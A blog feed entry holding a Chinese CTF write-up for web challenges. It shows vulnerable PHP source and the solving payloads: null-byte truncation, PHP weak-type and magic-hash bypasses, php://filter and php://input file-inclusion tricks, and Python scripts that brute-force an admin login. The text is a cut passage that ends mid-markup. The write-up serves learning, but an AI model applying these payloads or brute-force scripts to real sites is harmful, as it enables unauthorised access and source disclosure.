<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>iSky0t&#39;s Notes</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://isky0t.github.io/"/>
  <updated>2017-10-09T10:06:23.000Z</updated>
  <id>https://isky0t.github.io/</id>
  
  <author>
    <name>iSky0t</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>世安杯web-writeup</title>
    <link href="https://isky0t.github.io/2017/10/08/%E4%B8%96%E5%AE%89%E6%9D%AFweb-writeup/"/>
    <id>https://isky0t.github.io/2017/10/08/世安杯web-writeup/</id>
    <published>2017-10-08T07:17:39.000Z</published>
    <updated>2017-10-09T10:06:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>今天和几个大校的同学玩了下世安杯，然后遇到网站一直502也是挺醉的，下面是web部分的wp，自己写了下<br><a id="more"></a></p><h2 id="ctf入门级题目"><a href="#ctf入门级题目" class="headerlink" title="ctf入门级题目"></a>ctf入门级题目</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$flag = <span class="string">'*********'</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p class="alert"&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'--'</span>) !== <span class="keyword">FALSE</span>)</div><div class="line">        <span class="keyword">die</span>($flag);</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p class="alert"&gt;Invalid password&lt;/p&gt;'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line">&lt;section class="login"&gt;</div><div class="line">        &lt;div class="title"&gt;</div><div class="line">                &lt;a href=<span class="string">"./index.phps"</span>&gt;View Source&lt;/a&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line"></div><div class="line">        &lt;form method=<span class="string">"POST"</span>&gt;</div><div class="line">                &lt;input type=<span class="string">"text"</span> required name=<span class="string">"password"</span> placeholder=<span class="string">"Password"</span> /&gt;&lt;br/&gt;</div><div class="line">                &lt;input type=<span class="string">"submit"</span>/&gt;</div><div class="line">        &lt;/form&gt;</div><div class="line">&lt;/section&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure><p>给出了源码，诶？怎么似曾相识，应该是利用<code>ereg</code>遇到<code>%00</code>截断的方法，于是提交payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?password=test%00--</div></pre></td></tr></table></figure></p><p>注意<code>%</code>不要被URL编码，得到flag</p><h2 id="曲奇饼"><a href="#曲奇饼" class="headerlink" title="曲奇饼"></a>曲奇饼</h2><p>一看到这个URL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?line=&amp;file=a2V5LnR4dA==</div></pre></td></tr></table></figure></p><p>file应该是读取文件的文件名经过base64加密，解密下为key.txt，印证猜想，那就直接读取<code>index.php</code>把，加密后访问什么都没有，又注意到<code>line</code>参数，应该是行数吧？测试下的确是，于是写个脚本down下源代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">@author: iSky0t</span></div><div class="line"><span class="string">@contact: isky0toor@gmail.com</span></div><div class="line"><span class="string">@time: 2017/10/8 10:20</span></div><div class="line"><span class="string">"""</span></div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</div><div class="line">        url = <span class="string">"http://ctf1.shiyanbar.com/shian-quqi/index.php?line="</span>+str(i)+<span class="string">"&amp;file=aW5kZXgucGhw"</span></div><div class="line">        req = urllib2.Request(url)</div><div class="line">        f = urllib2.urlopen(req)</div><div class="line">        <span class="keyword">print</span> f.read()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">pass</span></div></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line"></div><div class="line"></div><div class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])?$_GET[<span class="string">'file'</span>]:<span class="string">""</span>);</div><div class="line"></div><div class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;file=a2V5LnR4dA=="</span>);</div><div class="line"></div><div class="line">$file_list = <span class="keyword">array</span>(</div><div class="line"></div><div class="line"><span class="string">'0'</span> =&gt;<span class="string">'key.txt'</span>,</div><div class="line"></div><div class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</div><div class="line"></div><div class="line">);</div><div class="line"></div><div class="line"> </div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'key'</span>]) &amp;&amp; $_COOKIE[<span class="string">'key'</span>]==<span class="string">'li_lr_480'</span>)&#123;</div><div class="line"></div><div class="line">$file_list[<span class="number">2</span>]=<span class="string">'thisis_flag.php'</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"> </div><div class="line"></div><div class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</div><div class="line"></div><div class="line">$fa = file($file);</div><div class="line"></div><div class="line"><span class="keyword">echo</span> $fa[$line];</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>看了下源代码后在<code>cookie</code>中添加了li_lr_480，再拼接base64加密的文件名，访问得到flag</p><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><p>这题卡了我好久，后来翻阅资料<a href="https://www.bertramc.cn/2017/03/25/20.html" target="_blank" rel="external">array_search</a>还去问了pcat表哥，结果表哥一步到位告诉了我方法和payload。。其本质还是函数的弱类型导致的绕过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">show_source(<span class="keyword">__FILE__</span>); </div><div class="line">$a=<span class="number">0</span>; </div><div class="line">$b=<span class="number">0</span>; </div><div class="line">$c=<span class="number">0</span>; </div><div class="line">$d=<span class="number">0</span>; </div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'x1'</span>])) </div><div class="line">&#123; </div><div class="line">        $x1 = $_GET[<span class="string">'x1'</span>]; </div><div class="line">        $x1==<span class="string">"1"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </div><div class="line">        <span class="keyword">switch</span> ($x1) </div><div class="line">        &#123; </div><div class="line">        <span class="keyword">case</span> <span class="number">0</span>: </div><div class="line">        <span class="keyword">case</span> <span class="number">1</span>: </div><div class="line">                $a=<span class="number">1</span>; </div><div class="line">                <span class="keyword">break</span>; </div><div class="line">        &#125; </div><div class="line">&#125; </div><div class="line">$x2=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'x2'</span>]); </div><div class="line"><span class="keyword">if</span>(is_array($x2))&#123; </div><div class="line">    is_numeric(@$x2[<span class="string">"x21"</span>])?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </div><div class="line">    <span class="keyword">if</span>(@$x2[<span class="string">"x21"</span>])&#123; </div><div class="line">        ($x2[<span class="string">"x21"</span>]&gt;<span class="number">2017</span>)?$b=<span class="number">1</span>:<span class="keyword">NULL</span>; </div><div class="line">    &#125; </div><div class="line">    <span class="keyword">if</span>(is_array(@$x2[<span class="string">"x22"</span>]))&#123; </div><div class="line">        <span class="keyword">if</span>(count($x2[<span class="string">"x22"</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array($x2[<span class="string">"x22"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"ha?"</span>); </div><div class="line">        $p = array_search(<span class="string">"XIPU"</span>, $x2[<span class="string">"x22"</span>]); </div><div class="line">        $p===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </div><div class="line">        <span class="keyword">foreach</span>($x2[<span class="string">"x22"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123; </div><div class="line">            $val===<span class="string">"XIPU"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </div><div class="line">        &#125; </div><div class="line">        $c=<span class="number">1</span>; </div><div class="line">&#125; </div><div class="line">&#125; </div><div class="line">$x3 = $_GET[<span class="string">'x3'</span>]; </div><div class="line"><span class="keyword">if</span> ($x3 != <span class="string">'15562'</span>) &#123; </div><div class="line">    <span class="keyword">if</span> (strstr($x3, <span class="string">'XIPU'</span>)) &#123; </div><div class="line">        <span class="keyword">if</span> (substr(md5($x3),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">'15562'</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123; </div><div class="line">            $d=<span class="number">1</span>; </div><div class="line">        &#125; </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"><span class="keyword">if</span>($a &amp;&amp; $b &amp;&amp; $c &amp;&amp; $d)&#123; </div><div class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>; </div><div class="line">    <span class="keyword">echo</span> $flag; </div><div class="line">&#125; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p>先来看看坑死我的这个函数</p><h3 id="array-search"><a href="#array-search" class="headerlink" title="array_search"></a>array_search</h3><p>手册里介绍的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed array_search ( mixed $needle , <span class="keyword">array</span> $haystack [, bool $strict = <span class="keyword">false</span> ] )</div></pre></td></tr></table></figure></p><p>两个参数必须，一个参数可选，也就是这个参数的问题。<br>该函数作用是在<code>$haystack</code>元素中寻找和<code>$needle</code>相同的元素，有则返回键名，无则返回<code>false</code>。</p><ul><li><code>$strict</code>默认为<code>false</code>时，不严格比较类型，会自动强制转换</li><li><code>$strict</code>为<code>true</code>时，严格比较类型</li></ul><p>搭配一个例子说明<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">$array=<span class="keyword">array</span>(<span class="number">0</span>,<span class="number">1</span>);</div><div class="line">var_dump(array_search(<span class="string">'XIPU'</span>, $array)); </div><div class="line">var_dump(array_search(<span class="string">'1XIPU'</span>, $array)); </div><div class="line"><span class="meta">?&gt;</span></div><div class="line">-----------</div><div class="line">int(<span class="number">0</span>)</div><div class="line">int(<span class="number">1</span>)</div></pre></td></tr></table></figure></p><p>于是这个搞定了，看下一个，pcat表哥直接给了我Python脚本，最后<code>$x3</code>主要是跑出一端md5值和15562中间那几位相等，那几位碰巧是<code>0e</code>打头，而又用的是<code>==</code>，所以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">__author__=<span class="string">'pcat@chamd5.org'</span></div><div class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></div><div class="line">    s = <span class="string">'XIPU'</span></div><div class="line">    myre = <span class="string">'0e\d&#123;14&#125;'</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000000</span>):</div><div class="line">        t = s + str(i)</div><div class="line">        x = md5(t).hexdigest()[<span class="number">8</span>:<span class="number">8</span> + <span class="number">16</span>]</div><div class="line">        <span class="keyword">if</span> re.match(myre, x) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">print</span> t</div><div class="line">            <span class="keyword">break</span></div><div class="line"></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span><span class="params">()</span>:</span></div><div class="line">    test()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">pass</span></div></pre></td></tr></table></figure><p>最后的payload自然出来了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?x1=0&amp;x2=&#123;&quot;x21&quot;:&quot;2018b&quot;,&quot;x22&quot;:[[&quot;XIPUx&quot;],0]&#125;&amp;x3=XIPU18570</div></pre></td></tr></table></figure><h2 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h2><p>这题把我坑的更惨。虽然一点儿不难<br>右键查看网页源代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- 听说密码是一个五位数字 --&gt;</span></div></pre></td></tr></table></figure></p><p>当时学弟提醒我直接爆破，我看完手上那个题目后，马上写了这个脚本着手爆破，但是爆破了几个小时（不会写多线程），爆破到了4w。后来忙完其他题目，再去看会不会是注入，但是根据猜测对username做的过滤就是只有admin才行。最后狗哥说就是爆破 而且密码是000325，我的心就碎了，我是从10000爆破到99999的。哇的一声哭出来~~~<br>附带狗哥的脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">import</span> codecs</div><div class="line">user_agent_list = [</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span>,</div><div class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span></div><div class="line">        ]</div><div class="line"></div><div class="line">url = <span class="string">'http://ctf1.shiyanbar.com/shian-s/'</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">logfile</span><span class="params">(log, logfile)</span>:</span></div><div class="line">    f = codecs.open(logfile, <span class="string">'a'</span>,<span class="string">'utf-8'</span>)</div><div class="line">    f.write(log + <span class="string">"\n"</span>)</div><div class="line">    f.close</div><div class="line">cookies = &#123;<span class="string">"PHPSESSID"</span>:<span class="string">"ttp2qsi06ksmf4t4h1pclk5uh1"</span>,<span class="string">"Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3"</span>:<span class="string">"1507184117"</span>,<span class="string">"Hm_cv_34d6f7353ab0915a4c582e4516dffbc3"</span>:<span class="string">"1*visitor*%E6%B8%B8%E5%AE%A2"</span>&#125;</div><div class="line"><span class="comment">#如果要上交wp请换成自己的cookie</span></div><div class="line"></div><div class="line">passwd = [i.replace(<span class="string">"\n"</span>, <span class="string">""</span>) <span class="keyword">for</span> i <span class="keyword">in</span> open(<span class="string">"m.txt"</span>, <span class="string">"r"</span>).readlines()]</div><div class="line"><span class="comment">#m.txt是我生成的00000到99999的字典，自己生成或者改名</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> passwd:</div><div class="line">    UA = random.choice(user_agent_list)  <span class="comment">#随机ua</span></div><div class="line">    headers = &#123;<span class="string">'User-Agent'</span>: UA&#125;  <span class="comment">#构造成一个完整的User-Agent</span></div><div class="line">    r =requests.get(url,headers=headers,cookies=cookies)</div><div class="line">    code = re.findall(<span class="string">r".*?&lt;br&gt;&lt;br&gt;(.*?)&lt;br&gt;&lt;br&gt;"</span>,r.text)[<span class="number">0</span>]</div><div class="line">    payloadurl= <span class="string">"http://ctf1.shiyanbar.com/shian-s/index.php?username=admin&amp;password=%s&amp;randcode=%s"</span>%(i,code)</div><div class="line">    <span class="comment">#print(payloadurl)</span></div><div class="line">    data = requests.get(payloadurl,headers=headers,cookies=cookies)</div><div class="line">    data.encoding=<span class="string">'utf-8'</span></div><div class="line">    <span class="comment"># print(data.text)</span></div><div class="line">    print(i)</div><div class="line">    data = data.text+<span class="string">"---------------%s"</span>%i</div><div class="line">    logfile(data,<span class="string">"data.txt"</span>)</div></pre></td></tr></table></figure></p><p>我的脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">@author: iSky0t</span></div><div class="line"><span class="string">@contact: isky0toor@gmail.com</span></div><div class="line"><span class="string">@time: 2017/10/8 11:28</span></div><div class="line"><span class="string">"""</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">99999</span>):</div><div class="line">        s = requests.session()</div><div class="line">        url = <span class="string">"http://ctf1.shiyanbar.com/shian-s/"</span></div><div class="line">        <span class="comment">#req = urllib2.Request(url)</span></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            f = s.get(url).text</div><div class="line">            num = re.findall(<span class="string">'&lt;br&gt;&lt;br&gt;(\d*)&lt;br&gt;&lt;br&gt;'</span>, f)</div><div class="line">            url = url + <span class="string">"?username=admin&amp;password="</span> + str(i).zfill(<span class="number">5</span>) + <span class="string">"&amp;randcode="</span> + num[<span class="number">0</span>]</div><div class="line">            result = s.get(url)</div><div class="line">            result.encoding = <span class="string">'utf-8'</span></div><div class="line">            <span class="keyword">if</span> (<span class="string">'密码错误'</span>.decode(<span class="string">'utf-8'</span>)) <span class="keyword">in</span> result.text:</div><div class="line">                <span class="keyword">print</span> <span class="string">"current num:"</span> + str(i).zfill(<span class="number">5</span>) + <span class="string">" --- "</span> + <span class="string">"password error"</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">print</span> <span class="string">"current num:"</span> + str(i).zfill(<span class="number">5</span>) + <span class="string">"----"</span> + result.text</div><div class="line">                exit()</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">continue</span></div><div class="line">    </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">pass</span></div></pre></td></tr></table></figure></p><p>学习到了个格式化函数，以后再写字典爆破时，不会这样了</p><blockquote><p>str.zfill(width)<br>Return the numeric string left filled with zeros in a string of length width. A sign prefix is handled correctly. The original string is returned if width is less than or equal to len(s).</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">n = <span class="string">"123"</span></div><div class="line">s = n.zfill(<span class="number">5</span>)</div><div class="line"><span class="keyword">assert</span> s == <span class="string">"00123"</span></div><div class="line"></div><div class="line">如果是纯数字</div><div class="line">n = <span class="number">123</span></div><div class="line">s = <span class="string">"%05d"</span> % n</div><div class="line"><span class="keyword">assert</span> s == <span class="string">"00123"</span></div></pre></td></tr></table></figure><h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>这题是学弟找到的有过的原题，我忙完后也看了下，感觉挺有意思的。<br>直接打开显示: <code>you are not admin !</code>，查看源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$user = $_GET[<span class="string">"user"</span>];</div><div class="line">$file = $_GET[<span class="string">"file"</span>];</div><div class="line">$pass = $_GET[<span class="string">"pass"</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</div><div class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>这边<code>$user</code>的内容用PHP伪协议来达到目的，php的封装协议<code>php://input</code>可以得到原始的post数据，还有<code>$file</code>也利用<code>php://filter</code>分装协议来读取内容，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php://filter/convert.base64-encode/resource=index.php</div></pre></td></tr></table></figure></p><p><img src="/images/shianbei01.png" alt="admin"><br>这边的读取结果是base64加密的，在解密后得到源代码<br><figure class="highlight 